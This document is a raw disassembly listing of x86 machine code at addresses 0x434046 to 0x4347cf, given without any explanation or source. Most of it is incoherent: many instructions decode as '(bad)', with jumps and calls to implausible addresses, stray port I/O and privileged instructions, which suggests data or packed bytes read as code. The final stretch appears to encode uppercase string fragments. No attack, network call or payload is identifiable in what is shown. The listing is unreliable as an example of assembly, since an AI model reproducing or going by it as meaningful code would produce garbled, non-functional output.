  434046:	fcom   DWORD PTR [ebp+0x45]
  434049:	mov    edi,DWORD PTR [eax]
  43404b:	adc    al,0x9c
  43404d:	inc    ebp
  43404e:	(bad)  
  43404f:	mov    ebx,eax
  434051:	adc    al,0x85
  434053:	cmp    al,0x1
  434056:	inc    ebp
  434057:	add    BYTE PTR [edx],bh
  434059:	dec    ebp
  43405a:	pushf  
  43405b:	mov    ebp,ecx
  43405d:	mov    eax,DWORD PTR [ebx]
  43405f:	nop
  434060:	add    BYTE PTR [eax],al
  434062:	inc    ebp
  434063:	mov    esi,DWORD PTR [ebx]
  434065:	add    eax,DWORD PTR [ebx]
  434067:	cmp    al,0x89
  434069:	mov    esp,esi
  43406b:	clc    
  43406c:	inc    ebp
  43406d:	inc    ebp
  43406e:	add    edx,DWORD PTR [esi+0xc]
  434071:	mov    edi,0x7ff0845
  434076:	in     al,dx
  434077:	(bad)  
  434078:	jne    0x434013
  43407a:	mov    esi,DWORD PTR [edx]
  43407c:	clc    
  43407d:	add    ebp,DWORD PTR [esi]
  43407f:	mov    edi,edi
  434081:	in     al,dx
  434082:	mov    DWORD PTR [ebp-0x10],eax
  434085:	xor    eax,DWORD PTR [ebp+0x3]
  434088:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  434090:	(bad)  
  434091:	push   eax
  434092:	ret    
  434093:	call   0xd4ffca25
  434098:	call   0xffcf38e2
  43409d:	cmp    BYTE PTR [ebp+0x4d],al
  4340a0:	test   DWORD PTR [eax+0x74],ecx
  4340a3:	inc    ecx
  4340a4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4340aa:	ret    
  4340ab:	inc    eax
  4340ac:	dec    DWORD PTR [ebx+0x4945f8f0]
  4340b2:	push   eax
  4340b3:	dec    eax
  4340b4:	test   al,0xd0
  4340b6:	dec    eax
  4340b8:	mov    eax,DWORD PTR [ebp-0x14]
  4340bb:	mov    eax,DWORD PTR [ebp+0x38]
  4340be:	mov    eax,ecx
  4340c0:	fadd   DWORD PTR [ebx]
  4340c2:	dec    ebp
  4340c3:	inc    eax
  4340c4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4340ca:	inc    ebp
  4340cb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4340d1:	fadd   QWORD PTR [ebx]
  4340d3:	inc    ebp
  4340d4:	or     al,0x33
  4340d6:	dec    ebp
  4340d7:	add    edi,DWORD PTR [ebx]
  4340d9:	mov    DWORD PTR [edx-0x28],esi
  4340dc:	mov    eax,DWORD PTR [ebp-0x10]
  4340df:	mov    eax,DWORD PTR [eax+0x10]
  4340e2:	mov    eax,edi
  4340e4:	lock ret 
  4340e6:	inc    ecx
  4340e7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  4340ed:	fsubr  st,st(5)
  4340ef:	test   DWORD PTR [eax],eax
  4340f1:	clc    
  4340f2:	push   0x45
  4340f4:	(bad)  
  4340f5:	cmp    ebp,esp
  4340f7:	pushf  
  4340f8:	inc    ebp
  4340f9:	(bad)  
  4340fa:	push   eax
  4340fb:	fsub   DWORD PTR [eax-0x7b]
  4340fe:	(bad)  
  4340ff:	clc    
  434100:	mov    eax,0xf8008584
  434105:	mov    eax,DWORD PTR [ebp-0x4]
  434108:	mov    edi,0x4585c3cc
  43410e:	clc    
  43410f:	mov    eax,DWORD PTR [ebp+0x14]
  434112:	cmp    BYTE PTR [ebp-0x64],al
  434115:	mov    edi,eax
  434117:	in     al,dx
  434118:	les    esi,FWORD PTR [ebp-0x7b]
  43411b:	mov    edi,eax
  43411d:	or     al,0x4d
  43411f:	dec    ebp
  434120:	mov    eax,ebp
  434122:	in     al,0xf2
  434124:	dec    ebp
  434125:	dec    DWORD PTR [ecx+0x4dc7e045]
  43412b:	fmul   DWORD PTR [ecx+0x4df8f085]
  434131:	inc    ebp
  434132:	mov    DWORD PTR [ebx],esi
  434134:	fadd   QWORD PTR [ebx]
  434136:	dec    ebp
  434137:	push   eax
  434138:	xor    eax,DWORD PTR [ebp+0x3]
  43413b:	push   eax
  43413c:	mov    DWORD PTR [eax+ebx*8],ebx
  43413f:	push   esi
  434141:	mov    eax,DWORD PTR [eax]
  434143:	lock cmp eax,0xf84e85c0
  434149:	inc    ebp
  43414a:	test   BYTE PTR [ebx],dh
  43414c:	add    DWORD PTR [ebx],eax
  43414e:	add    BYTE PTR [eax+0x4d],dl
  434151:	jne    0x434186
  434153:	lea    ecx,[ebx-0x7617fc44]
  434159:	div    ah
  43415b:	inc    DWORD PTR [ebp+0x45]
  43415e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  434164:	jb     0x4340f1
  434166:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43416d:	mov    ecx,DWORD PTR [ebp-0x10]
  434170:	xor    ecx,DWORD PTR [ebp+0x3]
  434173:	mov    edi,DWORD PTR [ebx]
  434175:	adc    BYTE PTR [ebp+0x41],dh
  434178:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43417e:	ret    
  43417f:	push   ss
  434180:	push   0x45
  434182:	lea    ecx,[ebx+0x4de80cb0]
  434188:	sti    
  434189:	add    edi,edi
  43418b:	or     BYTE PTR [ebp+0x4d],al
  43418e:	mov    ebp,DWORD PTR [ebx]
  434190:	xor    ebp,ecx
  434192:	mov    al,BYTE PTR [edx]
  434194:	add    eax,0xc7200
  434199:	jne    0x4341e8
  43419b:	lea    esi,[ebx]
  43419d:	mov    al,0xf
  43419f:	call   0xf3864
  4341a4:	shl    DWORD PTR [esi],0x84
  4341a7:	pushf  
  4341a8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4341ae:	mov    edi,DWORD PTR [ecx]
  4341b0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4341b7:	test   DWORD PTR [eax],eax
  4341b9:	clc    
  4341ba:	dec    ebp
  4341bb:	inc    ebp
  4341bc:	xor    edi,DWORD PTR [ebx]
  4341be:	setl   al
  4341c1:	(bad)  
  4341c2:	retf   
  4341c3:	rol    cl,1
  4341c5:	dec    ebp
  4341c6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4341cc:	inc    ebp
  4341cd:	lea    ecx,[ebx-0x75b2cc38]
  4341d3:	lea    eax,ds:0x4d72c4
  4341d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4341dc:	xor    ecx,edi
  4341de:	bswap  ebx
  4341e0:	ror    BYTE PTR [ebp-0x35],0xe9
  4341e4:	rol    DWORD PTR [ecx],0x84
  4341e7:	add    BYTE PTR [ecx],al
  4341e9:	cmp    BYTE PTR [eax],al
  4341eb:	pushf  
  4341ec:	inc    ebp
  4341ed:	jnp    0x8a4375f0
  4341f3:	mov    eax,DWORD PTR ds:0xcf72e8
  4341f9:	lock dec ebp
  4341fb:	retf   
  4341fc:	xor    ecx,DWORD PTR [ebp+0xf]
  4341ff:	mov    eax,eax
  434201:	fmul   st,st(3)
  434203:	test   ecx,0x1998484
  434209:	xor    al,BYTE PTR [eax]
  43420b:	mov    DWORD PTR [ebp-0x28],eax
  43420e:	mov    eax,DWORD PTR [ebp+0x33]
  434211:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434217:	ret    
  434218:	add    al,cl
  43421a:	dec    ebp
  43421b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  434221:	add    ecx,DWORD PTR ds:0xc7250
  434227:	inc    ebp
  434228:	rcl    DWORD PTR [eax+0x4d],0x2b
  43422c:	mov    edi,edi
  43422e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  434234:	jb     0x4341fd
  434236:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  43423d:	mov    esi,DWORD PTR [ebx]
  43423f:	cld    
  434240:	mov    cl,bh
  434242:	or     eax,0x372b6
  434247:	cmp    ecx,eax
  434249:	jne    0x4342c6
  43424f:	mov    eax,DWORD PTR [ebp-0x20]
  434252:	mov    eax,DWORD PTR [eax]
  434254:	xor    eax,edi
  434256:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  43425d:	mov    ecx,DWORD PTR [ebp-0x4]
  434260:	mov    ecx,edi
  434262:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434268:	jb     0x434279
  43426a:	add    BYTE PTR [edi-0x3f],dl
  43426d:	add    BYTE PTR [ebp-0x75],cl
  434270:	mov    esi,eax
  434272:	xor    eax,DWORD PTR [eax]
  434274:	mov    al,bh
  434276:	or     eax,0x497284
  43427b:	xor    al,cl
  43427d:	mov    ecx,DWORD PTR [ebp-0x4]
  434280:	mov    ecx,edi
  434282:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434288:	jb     0x434299
  43428a:	add    BYTE PTR [edi],dh
  43428c:	enter  0x8500,0x8b
  434290:	add    ah,bl
  434292:	add    BYTE PTR [eax],al
  434294:	inc    ebp
  434295:	(bad)  
  434296:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43429d:	mov    esi,DWORD PTR [edx-0x4]
  4342a0:	add    bh,cl
  4342a2:	dec    ebp
  4342a3:	mov    dh,0x8b
  4342a5:	add    esi,DWORD PTR [ebx]
  4342a7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4342ad:	add    BYTE PTR [eax],al
  4342af:	mov    eax,ecx
  4342b1:	loopne 0x434300
  4342b3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4342b9:	dec    ecx
  4342ba:	or     eax,0x8b7232
  4342bf:	in     al,0xc1
  4342c1:	or     DWORD PTR [ebp-0x31],ecx
  4342c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  4342cb:	xor    dh,BYTE PTR [edx-0x75]
  4342ce:	add    al,dh
  4342d0:	enter  0x4f09,0xcf
  4342d4:	inc    ebp
  4342d5:	mov    WORD PTR [ebx-0x75cdccb7],cs
  4342db:	or     al,BYTE PTR ds:0xe4728b
  4342e1:	or     DWORD PTR [ebp-0x31],ecx
  4342e4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  4342eb:	cmp    dh,BYTE PTR [edx+0xf]
  4342ee:	add    bl,dl
  4342f0:	rol    DWORD PTR [eax],0x4d
  4342f3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4342f9:	(bad)  
  4342fa:	or     eax,0x497284
  4342ff:	xor    al,cl
  434301:	mov    ecx,DWORD PTR [ebp-0x20]
  434304:	mov    ecx,DWORD PTR [ecx]
  434306:	xor    ecx,edi
  434308:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43430f:	xor    cl,al
  434311:	mov    ecx,DWORD PTR [edi]
  434313:	fadd   QWORD PTR [ebp+0x9]
  434316:	call   0xffd03dea
  43431b:	dec    ecx
  43431c:	dec    ebp
  43431d:	xor    bh,BYTE PTR [ebx]
  43431f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  434323:	loopne 0x434321
  434325:	or     edi,eax
  434327:	iret   
  434328:	ret    
  434329:	mov    WORD PTR [ebp+0x4d],es
  43432c:	mov    esi,DWORD PTR [edx]
  43432e:	call   0x84530a6d
  434333:	(bad)  
  434334:	cdq    
  434335:	add    BYTE PTR [edx],dh
  434337:	mov    esi,DWORD PTR [ebx]
  434339:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43433f:	test   BYTE PTR [ebx],dh
  434341:	dec    ecx
  434342:	add    esi,DWORD PTR [edx]
  434344:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43434a:	dec    edi
  43434c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  434353:	xor    al,BYTE PTR [ebx]
  434355:	mov    edi,DWORD PTR [ebx]
  434357:	in     al,0x75
  434359:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43435f:	dec    ecx
  434360:	xor    esi,DWORD PTR [edx]
  434362:	lea    ecx,[edx]
  434364:	or     BYTE PTR [ebx+0x900f072],cl
  43436a:	ja     0x43433b
  43436c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  434373:	cmp    ch,al
  434375:	jne    0x43436a
  434377:	mov    edi,edi
  434379:	fadd   QWORD PTR [ebp+0x0]
  43437c:	mov    eax,edi
  43437e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434385:	mov    edx,DWORD PTR [ebx]
  434387:	in     al,0x45
  434389:	or     DWORD PTR [ebx],esi
  43438b:	iret   
  43438c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434393:	xor    dl,BYTE PTR [eax-0x75]
  434396:	sbb    al,0xe0
  434398:	dec    DWORD PTR [ecx]
  43439a:	mov    ecx,edi
  43439c:	in     al,dx
  43439d:	mov    eax,es
  43439f:	dec    ecx
  4343a0:	mov    DWORD PTR [edx],esi
  4343a2:	fmul   QWORD PTR [edx]
  4343a4:	jne    0x434331
  4343a6:	(bad)  
  4343a7:	(bad)  
  4343a9:	or     DWORD PTR [ebp-0x31],eax
  4343ac:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  4343b3:	cmp    bh,bh
  4343b5:	jne    0x4343fc
  4343b7:	lea    ecx,[ebx-0x38372750]
  4343bd:	inc    ebx
  4343bf:	mov    eax,ecx
  4343c1:	mov    eax,0xa00c111
  4343c6:	jne    0x43440d
  4343c8:	mov    esi,DWORD PTR [ebx]
  4343ca:	test   al,0x3
  4343cc:	inc    ebp
  4343cd:	mov    DWORD PTR [eax-0xc],edx
  4343d0:	loop   0x434417
  4343d2:	push   DWORD PTR [ebx]
  4343d4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4343da:	add    DWORD PTR [eax],eax
  4343dc:	mov    eax,edi
  4343de:	lods   al,BYTE PTR ds:[esi]
  4343df:	dec    ebp
  4343e0:	inc    ebp
  4343e1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4343e7:	retf   
  4343e8:	mov    edx,ecx
  4343ea:	adc    al,0x84
  4343ec:	(bad)  
  4343ed:	std    
  4343ee:	ret    
  4343ef:	jmp    FWORD PTR [edi-0x2b7474bb]
  4343f5:	hlt    
  4343f6:	rol    edi,0x82
  4343f9:	ret    
  4343fa:	cld    
  4343fb:	enter  0x11ff,0x45
  4343ff:	inc    ebp
  434400:	pop    edi
  434401:	mov    ebx,DWORD PTR [ebx+0x14]
  434404:	ret    0xc7
  434407:	test   BYTE PTR [ebx+0x45325199],cl
  43440d:	jmp    0x43439a
  43440f:	push   0x8
  434411:	call   DWORD PTR [esi]
  434413:	in     al,dx
  434414:	add    BYTE PTR [ebp+0x1],0x50
  434418:	add    bh,ah
  43441a:	add    bh,bh
  43441c:	icebp  
  43441d:	mov    ecx,DWORD PTR [eax]
  43441f:	cld    
  434420:	pop    es
  434421:	dec    ebp
  434422:	shl    DWORD PTR [ebx],0x72
  434425:	add    eax,DWORD PTR [eax]
  434427:	cmp    edx,ecx
  434429:	je     0x43443b
  43442b:	mov    esi,DWORD PTR [ebp-0x4]
  43442e:	inc    edi
  434430:	or     al,0xc3
  434432:	jmp    FWORD PTR [edx-0x18]
  434435:	(bad)  
  434436:	sti    
  434437:	cwde   
  434438:	(bad)  
  434439:	call   0xffa13d44
  43443e:	or     al,0x45
  434440:	push   ebp
  434441:	sub    esp,0x18
  434444:	push   ebx
  434445:	inc    ebp
  434446:	mov    edi,edi
  434448:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43444f:	test   al,0x51
  434451:	inc    ebp
  434452:	push   ecx
  434453:	push   eax
  434454:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43445a:	add    ah,bh
  43445c:	(bad)  
  43445d:	dec    ebp
  43445e:	add    DWORD PTR [ebx],esi
  434460:	inc    ebp
  434461:	add    ecx,DWORD PTR [ebx+0x74943b]
  434467:	push   0xffffff8b
  434469:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43446f:	add    eax,DWORD PTR [ecx]
  434471:	or     BYTE PTR [eax],al
  434473:	call   0xff853c78
  434478:	mov    eax,DWORD PTR [ebp+0x14]
  43447b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434481:	inc    ebp
  434482:	dec    ecx
  434483:	add    ebp,DWORD PTR [edx+0x14]
  434486:	push   0x8b3045
  43448b:	call   0x33ad9200
  434490:	inc    DWORD PTR [ebx]
  434492:	mov    DWORD PTR [edi],ecx
  434494:	mov    eax,ecx
  434496:	or     BYTE PTR [ebp-0x3d],cl
  434499:	cmp    eax,edi
  43449b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4344a0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4344a6:	adc    al,0xc9
  4344a8:	inc    ebp
  4344a9:	adc    BYTE PTR [eax+0x55],dl
  4344ac:	jne    0x43449a
  4344ae:	call   0xff54443e
  4344b3:	dec    ebp
  4344b4:	inc    ebp
  4344b5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4344bb:	add    BYTE PTR [ebx],bh
  4344bd:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4344c1:	push   ecx
  4344c2:	or     al,0x51
  4344c4:	dec    ebp
  4344c5:	xor    DWORD PTR [ebx],0xf320399
  4344cb:	cmp    eax,DWORD PTR [ebp+0x74]
  4344ce:	mov    edi,edi
  4344d0:	pop    edi
  4344d1:	adc    BYTE PTR [ebx+0x75],bl
  4344d4:	ret    0x50
  4344d7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4344db:	(bad)  
  4344dc:	clc    
  4344dd:	mov    esp,ebp
  4344df:	pop    ecx
  4344e0:	mov    ecx,0xf80085c2
  4344e5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4344e8:	push   esi
  4344e9:	push   esi
  4344ea:	(bad)  
  4344eb:	lock add eax,DWORD PTR [ebp+0x44]
  4344ef:	mov    edx,DWORD PTR [eax]
  4344f1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4344f5:	or     BYTE PTR [ecx+0x7],dl
  4344f8:	push   ecx
  4344f9:	ret    
  4344fa:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434500:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434506:	or     al,0x80
  434508:	jge    0x43450b
  43450a:	mov    DWORD PTR [eax],eax
  43450c:	and    al,0x8
  43450e:	cmp    DWORD PTR [ebp+0x10],eax
  434511:	mov    edx,DWORD PTR [esi]
  434513:	xchg   esp,eax
  434514:	dec    esp
  434515:	add    BYTE PTR [eax],dl
  434517:	mov    ecx,edx
  434519:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43451d:	dec    ebp
  43451e:	into   
  43451f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  434525:	mov    edx,DWORD PTR [eax+0x14]
  434528:	das    
  434529:	add    al,0x45
  43452b:	add    BYTE PTR [ebp+0x0],dh
  43452e:	mov    edi,edi
  434530:	and    al,0x50
  434532:	mov    eax,DWORD PTR [eax]
  434534:	and    al,0xd1
  434536:	xor    eax,DWORD PTR [esi]
  434538:	lea    eax,[ebp+0x8]
  43453b:	xor    esi,DWORD PTR [edx+0x3]
  43453e:	add    BYTE PTR [ecx+0x4510fc44],cl
  434544:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  43454a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  434554:	cmp    edi,edi
  434556:	pushf  
  434557:	mov    edi,edi
  434559:	or     BYTE PTR [esi+ecx*1],cl
  43455c:	jne    0x434521
  43455e:	call   0xc452a
  434563:	adc    BYTE PTR [ebp+eax*2+0xc],al
  434567:	mov    ebx,DWORD PTR [eax]
  434569:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43456d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  434575:	pop    esi
  434576:	(bad)  
  434577:	leave  
  434578:	call   DWORD PTR [eax]
  43457a:	call   DWORD PTR [ebp+0x24]
  43457d:	in     al,dx
  43457e:	jmp    esp
  434580:	and    al,0x83
  434582:	call   0xff7a4397
  434587:	pushf  
  434588:	inc    esp
  434589:	mov    DWORD PTR [esp],ecx
  43458c:	pop    esi
  43458d:	push   edi
  43458e:	in     eax,0x41
  434590:	ret    0x89
  434593:	and    al,0xe
  434595:	mov    edi,DWORD PTR [eax]
  434597:	and    al,0x75
  434599:	mov    edx,0x7750885
  43459e:	or     dl,bh
  4345a0:	call   FWORD PTR [ecx+0x3243224]
  4345a6:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  4345ac:	dec    DWORD PTR [esp]
  4345af:	jl     0x43453c
  4345b1:	adc    al,0xc
  4345b3:	dec    ebp
  4345b4:	cmp    DWORD PTR [ebp+0x1c],esi
  4345b7:	mov    ecx,DWORD PTR [eax]
  4345b9:	and    al,0x10
  4345bb:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  4345c2:	test   DWORD PTR [edi],ecx
  4345c4:	jge    0x434590
  4345c6:	push   0x8908ff4c
  4345cb:	jmp    0x4345f1
  4345cd:	adc    BYTE PTR [esp+eax*2-0x75],dh
  4345d1:	dec    esp
  4345d2:	pop    ebp
  4345d3:	ret    0x8999
  4345d6:	push   0x74f89cf8
  4345db:	jmp    0x434651
  4345dd:	mov    edi,0x104fd55f
  4345e2:	add    BYTE PTR [eax],dh
  4345e4:	adc    BYTE PTR ds:[eax],al
  4345e7:	or     edx,DWORD PTR gs:[eax]
  4345ea:	add    BYTE PTR [ecx],ch
  4345ec:	add    eax,0x35270010
  4345f1:	adc    BYTE PTR [eax],al
  4345f3:	std    
  4345f4:	dec    eax
  4345f5:	adc    BYTE PTR [eax],al
  4345f7:	(bad)  
  4345f8:	outs   dx,BYTE PTR ds:[esi]
  4345f9:	adc    BYTE PTR [eax],al
  4345fb:	sahf   
  4345fc:	xor    DWORD PTR [eax],edx
  4345fe:	add    BYTE PTR [esi+0x0],al
  434601:	adc    BYTE PTR [eax],al
  434603:	fs jae 0x434616
  434606:	add    BYTE PTR [ebx-0x20ffefac],bh
  43460c:	inc    ebp
  43460d:	inc    ebx
  43460e:	add    bl,ah
  434610:	inc    ebp
  434611:	inc    ebx
  434612:	add    bh,ah
  434614:	inc    ebp
  434615:	inc    ebx
  434616:	add    bl,ch
  434618:	inc    ebp
  434619:	inc    ebx
  43461a:	add    bh,ch
  43461c:	inc    ebp
  43461d:	inc    ebx
  43461e:	add    bl,dh
  434620:	inc    ebp
  434621:	inc    ebx
  434622:	add    bh,dh
  434624:	inc    ebp
  434625:	inc    ebx
  434626:	add    bl,bh
  434628:	inc    ebp
  434629:	inc    ebx
  43462a:	add    bh,bh
  43462c:	inc    ebp
  43462d:	inc    ebx
  43462e:	add    BYTE PTR [ebx],al
  434630:	inc    esi
  434631:	inc    ebx
  434632:	add    BYTE PTR [edi],al
  434634:	inc    esi
  434635:	inc    ebx
  434636:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  43463d:	adc    BYTE PTR [eax],al
  43463f:	adc    dh,BYTE PTR [ecx+0x10]
  434642:	add    BYTE PTR [edi+0x2c001065],al
  434648:	push   0x5aa20010
  43464d:	adc    BYTE PTR [eax],al
  43464f:	rol    DWORD PTR [eax+edx*1],0x0
  434653:	int    0x6f
  434655:	adc    BYTE PTR [eax],al
  434657:	aaa    
  434658:	inc    esi
  434659:	inc    ebx
  43465a:	add    BYTE PTR [ebx],bh
  43465c:	inc    esi
  43465d:	inc    ebx
  43465e:	add    BYTE PTR [edi],bh
  434660:	inc    esi
  434661:	inc    ebx
  434662:	add    BYTE PTR [ebx+0x46],al
  434665:	inc    ebx
  434666:	add    BYTE PTR [edi+0x46],al
  434669:	inc    ebx
  43466a:	add    BYTE PTR [ebx+0x46],cl
  43466d:	inc    ebx
  43466e:	add    BYTE PTR [edi+0x46],cl
  434671:	inc    ebx
  434672:	add    BYTE PTR [ebx+0x46],dl
  434675:	inc    ebx
  434676:	add    BYTE PTR [ebx+0x54001005],dh
  43467c:	push   ebp
  43467d:	adc    BYTE PTR [eax],al
  43467f:	sbb    bh,BYTE PTR [eax]
  434681:	adc    BYTE PTR [eax],al
  434683:	mov    edx,0x2f001013
  434688:	dec    edx
  434689:	adc    BYTE PTR [eax],al
  43468b:	inc    ecx
  43468c:	or     edx,DWORD PTR [eax]
  43468e:	add    BYTE PTR [ebx+0x19],ch
  434691:	adc    BYTE PTR [eax],al
  434693:	mov    esp,0x7700103e
  434698:	inc    esi
  434699:	inc    ebx
  43469a:	add    BYTE PTR [ebx+0x46],bh
  43469d:	inc    ebx
  43469e:	add    BYTE PTR [edi+0x46],bh
  4346a1:	inc    ebx
  4346a2:	add    BYTE PTR [ebx-0x78ffbcba],al
  4346a8:	inc    esi
  4346a9:	inc    ebx
  4346aa:	add    BYTE PTR [ebx-0x70ffbcba],cl
  4346b0:	inc    esi
  4346b1:	inc    ebx
  4346b2:	add    BYTE PTR [ebx-0x50ffbcba],dl
  4346b8:	push   0x10
  4346ba:	add    al,bl
  4346bc:	imul   edx,DWORD PTR [eax],0x0
  4346bf:	sahf   
  4346c0:	push   ss
  4346c1:	adc    BYTE PTR [eax],al
  4346c3:	jle    0x4346ff
  4346c5:	adc    BYTE PTR [eax],al
  4346c7:	jbe    0x4346de
  4346c9:	adc    BYTE PTR [eax],al
  4346cb:	cmp    DWORD PTR [edi+0x10],edx
  4346ce:	add    BYTE PTR [ebp+0x59001066],bl
  4346d4:	adc    al,0x10
  4346d6:	add    BYTE PTR [edi-0x44ffbcba],dh
  4346dc:	inc    esi
  4346dd:	inc    ebx
  4346de:	add    BYTE PTR [edi-0x3cffbcba],bh
  4346e4:	inc    esi
  4346e5:	inc    ebx
  4346e6:	add    bh,al
  4346e8:	inc    esi
  4346e9:	inc    ebx
  4346ea:	add    bl,cl
  4346ec:	inc    esi
  4346ed:	inc    ebx
  4346ee:	add    bh,cl
  4346f0:	inc    esi
  4346f1:	inc    ebx
  4346f2:	add    bl,dl
  4346f4:	inc    esi
  4346f5:	inc    ebx
  4346f6:	add    BYTE PTR [ebx-0x6affef90],bh
  4346fc:	inc    ebp
  4346fd:	adc    BYTE PTR [eax],al
  4346ff:	dec    ebx
  434700:	dec    eax
  434701:	adc    BYTE PTR [eax],al
  434703:	dec    ebx
  434704:	popa   
  434705:	adc    BYTE PTR [eax],al
  434707:	adc    al,BYTE PTR [eax+edx*1]
  43470a:	add    dh,dl
  43470c:	push   ds
  43470d:	adc    BYTE PTR [eax],al
  43470f:	hlt    
  434710:	pop    ds
  434711:	adc    BYTE PTR [eax],al
  434713:	dec    ecx
  434714:	pop    eax
  434715:	adc    BYTE PTR [eax],al
  434717:	test   DWORD PTR [esi+0x43],0x4346fb00
  43471e:	add    bh,bh
  434720:	inc    esi
  434721:	inc    ebx
  434722:	add    BYTE PTR [ebx],al
  434724:	inc    edi
  434725:	inc    ebx
  434726:	add    BYTE PTR [edi],al
  434728:	inc    edi
  434729:	inc    ebx
  43472a:	add    BYTE PTR [ebx],cl
  43472c:	inc    edi
  43472d:	inc    ebx
  43472e:	add    BYTE PTR [edi],cl
  434730:	inc    edi
  434731:	inc    ebx
  434732:	add    BYTE PTR [ebx],dl
  434734:	inc    edi
  434735:	inc    ebx
  434736:	add    BYTE PTR [ebp+0x57],cl
  434739:	xor    DWORD PTR [ecx],esi
  43473b:	cmp    BYTE PTR [edi+ebx*2],dh
  43473e:	push   ecx
  43473f:	add    BYTE PTR [edx+0x33],dl
  434742:	push   esi
  434743:	xor    eax,0x3849515f
  434748:	xor    al,0x59
  43474a:	push   edi
  43474b:	add    BYTE PTR [ebx+0x54],al
  43474e:	inc    ebp
  43474f:	pop    edi
  434750:	dec    ebx
  434751:	push   edx
  434752:	push   ebp
  434753:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  434758:	pop    edi
  434759:	aaa    
  43475a:	xor    al,0x32
  43475c:	xor    BYTE PTR [edi+0x5f],al
  43475f:	inc    ebx
  434760:	pop    edx
  434761:	add    BYTE PTR [edi+0x4e],al
  434764:	cmp    DWORD PTR [edi+0x47],ebx
  434767:	push   ebx
  434768:	cmp    DWORD PTR [edi+0x4e],edx
  43476b:	add    BYTE PTR [ecx+0x44],dl
  43476e:	cmp    BYTE PTR [edi+0x33],bl
  434771:	cmp    BYTE PTR [eax],dh
  434773:	pop    edi
  434774:	inc    ecx
  434775:	dec    edi
  434776:	inc    esi
  434777:	push   eax
  434778:	add    BYTE PTR [edx+0x43],dl
  43477b:	xor    eax,0x41305f30
  434780:	xor    BYTE PTR [esi+0x5f],al
  434783:	inc    ebx
  434784:	xor    dh,BYTE PTR [edx]
  434786:	xor    eax,0x36545200
  43478b:	xor    al,0x5f
  43478d:	dec    esi
  43478e:	xor    esi,DWORD PTR [edx]
  434790:	add    BYTE PTR ss:[eax+0x4b],cl
  434794:	inc    ebx
  434795:	pop    edi
  434796:	ss xor al,0x34
  434799:	pop    edi
  43479a:	inc    ecx
  43479b:	push   esp
  43479c:	dec    edi
  43479d:	add    BYTE PTR [esi+0x52],dl
  4347a0:	push   esi
  4347a1:	pop    edi
  4347a2:	inc    esi
  4347a3:	push   ecx
  4347a4:	push   ebp
  4347a5:	push   edx
  4347a6:	dec    eax
  4347a7:	add    BYTE PTR [esi+0x41],cl
  4347aa:	inc    edx
  4347ab:	pop    edi
  4347ac:	xor    DWORD PTR [ecx],edi
  4347ae:	push   edi
  4347af:	pop    edi
  4347b0:	pop    edx
  4347b1:	xor    eax,0x47003934
  4347b6:	push   edx
  4347b7:	push   ebp
  4347b8:	pop    edi
  4347b9:	xor    al,BYTE PTR [edx+0x30]
  4347bc:	push   ebx
  4347bd:	dec    esi
  4347be:	xor    eax,0x38564300
  4347c3:	xor    al,0x5f
  4347c5:	xor    bl,BYTE PTR [eax+0x36]
  4347c8:	inc    edx
  4347c9:	pop    edi
  4347ca:	pop    ecx
  4347cb:	xor    al,BYTE PTR [ecx+0x0]
  4347ce:	push   edi
  4347cf:	dec    ecx
